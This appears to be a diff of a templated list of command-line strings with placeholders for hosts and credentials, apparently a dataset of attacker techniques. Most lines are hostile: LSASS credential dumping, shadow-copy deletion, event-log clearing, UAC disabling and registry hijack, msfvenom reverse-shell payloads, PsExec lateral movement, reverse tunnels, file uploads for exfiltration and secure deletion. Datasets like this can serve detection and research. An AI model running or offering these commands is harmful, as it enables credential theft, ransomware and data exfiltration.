-ssmtp ${username}@${domain} < mail.txt 2> /dev/null
-powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-powershell -c "mstsc /v:${ip_address} /f /restrictedAdmin"
-echo ${email_content} | sendmail ${username}@${domain}
-echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
-cmd /c "ipconfig /renew"
-certutil -encode -Unicode -v -f error.txt encode.txt
-cmd /c "procdump.exe -ma lsass.exe lsassdump.dmp"
-cmd /c "ipconfig /allcompartments"
-powershell -c "netstat.exe -r"
-mstsc /v:${ip_address} /restrictedAdmin
-powershell -c "mstsc /v:${ip_address} /multimon"
-curl -X POST http://${ip_address}/upload -F "files=@${source_file_path}"
-powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-powershell -c "mstsc /v:${ip_address}"
-powershell -c "del /f /q ${local_file_path}"
-wmic os get CSName
-cmd /c "sdelete -f -accepteula ${local_file_path}"
-nmap -p- ${ip_address} 2> error.log
-7z a -slp ${destination_file_path} ${source_file_path} -p${password}
-cmd /c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
-rm -rf ${local_file_path} 2> &1
-choco install -f rclone
-choco install procdump
-nmap -v ${ip_address}
-cmd /c "choco install putty"
-cmd /c "choco install procdump"
-mstsc /v:${ip_address} /f /restrictedAdmin
-ipconfig.exe /all
-plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-cmd /c "certutil -encode -v error.txt encode.txt"
-powershell -c "mstsc.exe /v:${ip_address} /remoteGuard"
-cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-wmic.exe os get FreePhysicalMemory
-wevtutil cl security
-cmd /c "del /p /q ${local_file_path}"
-cmd /c "procdump.exe -ma lsass lsassdump.dmp"
-cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-cmd /c "wmic.exe shadowcopy call create Volume=C:"
-cmd /c "msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-7z.exe a -p${password} ${destination_file_path} ${source_file_path}
-wevtutil clear-log security
-powershell -c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-certutil -encode -Unicode -gmt error.txt encode.txt
-sdelete -f -q ${local_file_path}
-cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-sdelete -s -q -accepteula ${local_file_path}
-powershell -c "7z a -p${password} ${destination_file_path} ${source_file_path}"
-plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-powershell -c "7z.exe a -slp -p ${destination_file_path} ${source_file_path}"
-vssadmin.exe Delete Shadows /all /Quiet
-mstsc /v:${ip_address} /f /admin
-powershell -c "wevtutil clear-log security"
-msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 procdump -mm lsass.exe lsassdump.dmp
-psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-cmd /c "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-powershell -c "choco install Megasync"
-cmd /c "curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-sendmail ${username}@${domain} < mail.txt
-cmd /c "netstat -a"
-nmap -v -A ${ip_address} 2> error.log
-cmd /c "vssadmin.exe delete shadows /all"
-plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-nmap -p- -sC ${ip_address} 2> &1
-powershell -c "sdelete -q -accepteula ${local_file_path}"
-powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-7z a -p ${destination_file_path} ${source_file_path}
-powershell -c "curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> /dev/null
-cmd /c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
-choco install -y rclone
-powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-cat email.txt | sendmail ${username}@${domain} 2> &1
-psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-mstsc /v:${ip_address} /f /remoteGuard
-cmd /c "netstat -r"
-choco install rclone
-wmic.exe os get Caption
-psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s
-cmd /c "msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-powershell -c "curl -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-powershell -c "arp -a"
-msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s
-powershell -c "del /q ${local_file_path}"
-nmap -p- -sC -sV ${ip_address} 2> &1
-cmd /c "choco install -y psexec"
-powershell -c "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-procdump.exe -accepteula -mm lsass lsassdump.dmp
-powershell -c "arp.exe -a"
-powershell -c "plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-cmd /c "vssadmin delete shadows /all /Quiet"
-nmap -PN ${ip_address} 2> error.log
-powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-nmap -p- -sC -sV -O -A ${ip_address}
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-hostname
 rm -f ${local_file_path} 2> /dev/null
-cmd /c "procdump.exe -accepteula -mm lsass.exe lsassdump.dmp"
-curl.exe -X POST http://${ip_address}/upload -H -F "files=@${source_file_path}"
-cmd /c "plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-nmap -sP ${ip_address}
-curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
-cmd /c "taskkill.exe /f /im ${process_name}"
-cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-powershell -c "taskkill /F /IM ${process_name}"
-sdelete.exe ${local_file_path}
-procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
-powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-taskkill.exe /f /im ${process_name} /T
-Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-ipconfig /renew
-cmd /c "sdelete.exe -f ${local_file_path}"
-cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-7z.exe a -slp -p ${destination_file_path} ${source_file_path}
-cmd /c "plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-cmd /c "wmic os get FreePhysicalMemory"
-cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload
-plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-cmd /c "certutil -encode -UnicodeText error.txt encode.txt"
-msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-cmd /c "plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
-echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
-powershell -c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-powershell -c "wevtutil.exe cl security"
-mstsc.exe /v:${ip_address} /restrictedAdmin
-taskkill.exe /F /im ${process_name} /T
-7z.exe a ${destination_file_path} ${source_file_path} -p${password}
-cmd /c "plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-cmd /c "taskkill.exe /F /im ${process_name}"
-powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-powershell -c "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-powershell -c "certutil -encode -UnicodeText -v error.txt encode.txt"
-sdelete -s -accepteula ${local_file_path}
-cmd /c "vssadmin.exe Delete Shadows /all /quiet"
-powershell -c "certutil -encode -Unicode -gmt error.txt encode.txt"
-cmd /c "sdelete.exe -accepteula ${local_file_path}"
-cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-mail -s ${email_subject} ${username}@${domain} < mail.txt 2> &1
-cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
-cmd /c "wmic os get Caption,Version"
-powershell -c "vssadmin Delete Shadows /All"
-cmd /c "del /f ${local_file_path}"
-powershell -c "mstsc.exe /v:${ip_address} /admin"
-wevtutil cl application
-cmd /c "msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-certutil -encode -Unicode -f error.txt encode.txt
-cmd /c "tasklist"
-cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-powershell -c "mstsc /v:${ip_address} /admin"
-powershell -c "certutil -encode ${source_file_path} ${destination_file_path}"
-taskkill.exe /im ${process_name}
-powershell -c "wmic.exe os get Caption"
-cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
-cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
-nmap -sV ${ip_address} 2> /dev/null
-cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
-powershell -c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}"
-powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-cmd /c "certutil -encode -Unicode -gmt -v -f error.txt encode.txt"
-cmd /c "procdump -accepteula -mm lsass.exe lsassdump.dmp"
-vssadmin.exe Delete Shadows /all /quiet
-powershell -c "7z a -slt ${destination_file_path} ${source_file_path} -p"
-powershell -c "sdelete -f ${local_file_path}"
-mstsc.exe /v:${ip_address} /f
-vssadmin delete shadows /all /Quiet
-powershell -c "vssadmin.exe Delete Shadows /all /Quiet"
-cmd /c "mstsc.exe /v:${ip_address} /f /admin"
-ssmtp ${username}@${domain} < mail.txt 2> error.log
-powershell -c "procdump.exe -ma lsass.exe lsassdump.dmp"
-hostname.exe
-wmic os get Version
-nmap -p- -sC ${ip_address} 2> error.log
-cmd /c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
-cmd /c "mstsc /v:${ip_address} /f /restrictedAdmin"
-choco install -f 7zip
-del /q /f ${local_file_path}
-powershell -c "sdelete.exe -accepteula ${local_file_path}"
-powershell -c "choco install -y rclone"
-sdelete -q ${local_file_path}
-powershell -c "netstat"
-7z a -slt -p ${destination_file_path} ${source_file_path}
-nmap -T5 ${ip_address} 2> &1
-cmd /c "procdump -accepteula -ma lsass.exe lsassdump.dmp"
-cmd /c "netstat.exe"
-cmd /c "vssadmin.exe Delete Shadows /all"
-cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-procdump.exe -mm lsass lsassdump.dmp
-mstsc /v:${ip_address}
-nmap -sP ${ip_address} 2> /dev/null
-mstsc /v:${ip_address} /f /public
-cat email.txt | ssmtp ${username}@${domain} 2> /dev/null
-cmd /c "plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-wmic os get Caption,Version
-cmd /c "7z.exe a ${destination_file_path} ${source_file_path} -p"
-powershell -c "plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-powershell -c "netstat -f"
-cmd /c "procdump -mm lsass lsassdump.dmp"
-powershell -c "netstat.exe -q"
-powershell -c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-cmd /c "vssadmin Delete Shadows /all /Quiet"
-cmd /c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-powershell -c "procdump -mm lsass.exe lsassdump.dmp"
-plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
-Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
-cmd /c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-wmic.exe os get Caption,Version
-powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-rm -r ${local_file_path}
-powershell -c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
-echo -e ${email_content} | ssmtp ${username}@${domain}
-Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> error.log
-powershell -c "taskkill.exe /f /im ${process_name} /T"
-cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-cmd /c "wmic os get Name"
-vssadmin create shadow /for=C:
-powershell -c "wmic shadowcopy call create Volume=C:"
-cmd /c "mstsc /v:${ip_address} /f /remoteGuard"
-plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> /dev/null
-cmd /c "choco install -f psexec"
-cmd /c "msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-procdump -mm lsass lsassdump.dmp
-powershell -c "curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-vssadmin Delete Shadows /All
-cmd /c "wevtutil clear-log system"
-nmap -v ${ip_address} 2> error.log
-cmd /c "wmic.exe os get Version"
-cmd /c "wevtutil.exe cl application"
-ipconfig /all
-cmd /c "mstsc.exe /v:${ip_address} /remoteGuard"
-echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> &1
-powershell -c "netstat -r"
-reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
-powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
-Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-powershell -c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-cmd /c "mstsc.exe /v:${ip_address} /f /restrictedAdmin"
-wevtutil cl system
-powershell -c "sdelete.exe -q -accepteula ${local_file_path}"
-cmd /c "choco install 7zip"
-powershell -c "wmic.exe os get Version"
-7z.exe a ${destination_file_path} ${source_file_path} -p
-wmic shadowcopy call create Volume=C:
-powershell -c "ipconfig /allcompartments"
-powershell -c "mstsc.exe /v:${ip_address} /f /admin"
-cmd /c "ipconfig.exe"
-wevtutil.exe cl security
-powershell -c "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "procdump -mm lsass.exe lsassdump.dmp"
-powershell -c "7z.exe a -slt -p ${destination_file_path} ${source_file_path}"
-curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
-powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-powershell -c "vssadmin delete shadows /all /Quiet"
-psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
-powershell -c "choco install -f psexec"
-psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-certutil -encode -UnicodeText -v error.txt encode.txt
-psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
-vssadmin delete shadows /All /quiet
-powershell -c "vssadmin Delete Shadows /all /Quiet"
-powershell -c "vssadmin delete shadows /all"
-choco install -f ngrok
-curl -X POST -H -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
-psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-cmd /c "del /f /p ${local_file_path}"
-powershell -c "choco install -f ngrok"
-cmd /c "arp -g"
-powershell -c "certutil -encode -v error.txt encode.txt"
-cmd /c "choco install -f ngrok"
-plink.exe -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-cmd /c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
-powershell -c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
-cmd /c "certutil -encode -Unicode -gmt -f error.txt encode.txt"
-cmd /c "vssadmin.exe Delete Shadows /All"
-mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> /dev/null
-cmd /c "procdump.exe -accepteula -ma lsass.exe lsassdump.dmp"
-cmd /c "wmic.exe os get TotalVirtualMemorySize"
-cmd /c "systeminfo"
-powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-powershell -c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-taskkill /F /im ${process_name}
-powershell -c "wevtutil cl application"
-powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
-del /f /p ${local_file_path}
-cmd /c "procdump.exe -accepteula -mm lsass lsassdump.dmp"
-powershell -c "wmic.exe os get TotalVirtualMemorySize"
-wmic os get FreePhysicalMemory
-cmd /c "taskkill /f /im ${process_name} /T"
-cmd /c "mstsc.exe /v:${ip_address} /f /remoteGuard"
-cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
-cmd /c "certutil -encode -v -f error.txt encode.txt"
-sdelete -f -accepteula ${local_file_path}
-nmap -A ${ip_address}
-powershell -c "mstsc /v:${ip_address} /restrictedAdmin"
-Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
-cmd /c "certutil -encode -gmt -v -f error.txt encode.txt"
-cmd /c "curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-powershell -c "sdelete ${local_file_path}"
-cmd /c "sdelete -s -q -accepteula ${loal_file_path}"
-powershell -c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
-powershell -c "msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-cmd /c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
-netstat -r
-powershell -c "sdelete.exe -q ${local_file_path}"
-wevtutil.exe cl application
-sc stop ${service_name}
-plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-netstat.exe -r
-netstat -f
-ssmtp ${username}@${domain} < mail.txt
-cmd /c "vssadmin.exe delete shadows /All /quiet"
-powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-cmd /c "rmdir /q /s ${local_file_path}"
-nmap --open ${ip_address} 2> error.log
-wmic os get Caption
-powershell -c "choco install rclone"
-reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
-powershell -c "rmdir /s ${local_file_path}"
-mstsc.exe /v:${ip_address} /remoteGuard
-cmd /c "choco install rclone"
-wmic.exe os get TotalVirtualMemorySize
-cmd /c "certutil -encode -gmt ${source_file_path} ${destination_file_path}"
-reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
-powershell -c "wmic.exe os get Caption,Version"
-cmd /c "choco install -f procdump"
-powershell -c "ipconfig.exe /all"
-cmd /c "curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-nmap -p- -sC -sV ${ip_address} 2> /dev/null
-cmd /c "wmic.exe os get FreePhysicalMemory"
-powershell -c "taskkill /im ${process_name}"
-cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> /dev/null
-plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
-powershell -c "netstat.exe -a"
-echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> &1
-powershell -c "procdump -ma lsass lsassdump.dmp"
 cmd /c "wmic os get TotalVirtualMemorySize"
-nmap ${ip_address} 2> &1
-plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
-cmd /c "wmic os get CSName"
-Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-powershell -c "plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
-cmd /c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-nmap -A ${ip_address} 2> /dev/null
-cmd /c "vssadmin delete shadows /All"
-cmd /c "del /q /f ${local_file_path}"
-powershell -c "rmdir /q /s ${local_file_path}"
-certutil -encode -v error.txt encode.txt
-cmd /c "del /q ${local_file_path}"
-cmd /c "7z a -slt ${destination_file_path} ${source_file_path} -p"
-netstat
-cmd /c "mstsc.exe /v:${ip_address} /restrictedAdmin"
-procdump -ma lsass lsassdump.dmp
-powershell -c "curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
-cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}"
-cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
-powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
-powershell -c "sdelete -f -accepteula ${local_file_path}"
-curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
-cmd /c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-cmd /c "netstat.exe -r"
-mstsc.exe /v:${ip_address} /f /admin
-powershell -c "7z a ${destination_file_path} ${source_file_path} -p"
-powershell -c "plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-powershell -c "vssadmin.exe delete shadows /All"
-cmd /c "sdelete.exe -s ${local_file_path}"
-rm -fr ${local_file_path} 2> &1
-powershell -c "wevtutil cl security"
-echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> /dev/null
-del /f /q ${local_file_path}
-cat email.txt | mutt -s ${email_subject} ${username}@${domain}
-cmd /c "plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
-vssadmin.exe Delete Shadows /All
-powershell -c "certutil -encode -gmt -v -f error.txt encode.txt"
-sdelete -s ${local_file_path}
-cmd /c "wevtutil cl system"
-Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
-cmd /c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-cmd /c "procdump -accepteula -mm lsass lsassdump.dmp"
-nmap -p- -sC -sV -O ${ip_address} 2> error.log
-echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> error.log
-powershell -c "del /q /f ${local_file_path}"
-echo -e ${email_content} | ssmtp ${username}@${domain} 2> /dev/null
-cmd /c "plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-wevtutil clear-log application
-powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ"
-echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> error.log
-powershell -c "del /q /p ${local_file_path}"
-msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-powershell -c "choco install -y ngrok"
-curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload
-nmap -p- -sC -sV ${ip_address} 2> error.log
-sdelete.exe -q ${local_file_path}
-cmd /c "mstsc /v:${ip_address} /remoteGuard"
-nmap -F ${ip_address} 2> error.log
-cmd /c "vssadmin create shadow /for=C:"
-rm -r ${local_file_path} 2> &1
-7z a -slt -p${password} ${destination_file_path} ${source_file_path}
-curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-powershell -c "vssadmin Delete Shadows /all /quiet"
-powershell -c "mstsc /v:${ip_address} /f /public"
-cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
-Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
-cmd /c "wevtutil clear-log application"
-vssadmin.exe delete shadows /All /Quiet
-certutil -encode -gmt ${source_file_path} ${destination_file_path}
-reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
-cmd /c "vssadmin.exe delete shadows /All"
-taskkill /f /im ${process_name}
-powershell -c "net.exe stop ${service_name}"
-taskkill.exe /F /im ${process_name}
-powershell -c "ipconfig /renew"
-Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
-powershell -c "certutil -encode -f ${source_file_path} ${destination_file_path}"
-powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
-powershell -c "taskkill /f /im ${process_name} /T"
-powershell -c "tasklist.exe"
-curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
-powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p"
-cmd /c "plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+rm -r ${local_file_path}
+cmd /c "wevtutil.exe cl application"
+rm -f ${local_file_path} 2> &1
+procdump.exe -accepteula -mm lsass.exe lsassdump.dmp
+powershell -c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
+cmd /c "vssadmin.exe delete shadows /all /quiet"
+cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
+plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+vssadmin Delete Shadows /all
+nmap -F ${ip_address} 2> /dev/null
+nmap -sC ${ip_address} 2> /dev/null
+powershell -c "wmic.exe os get Caption"
 rm -rf ${local_file_path} 2> error.log
-mail -s ${email_subject} ${username}@${domain} < mail.txt 2> error.log
+vssadmin Delete Shadows /all /quiet
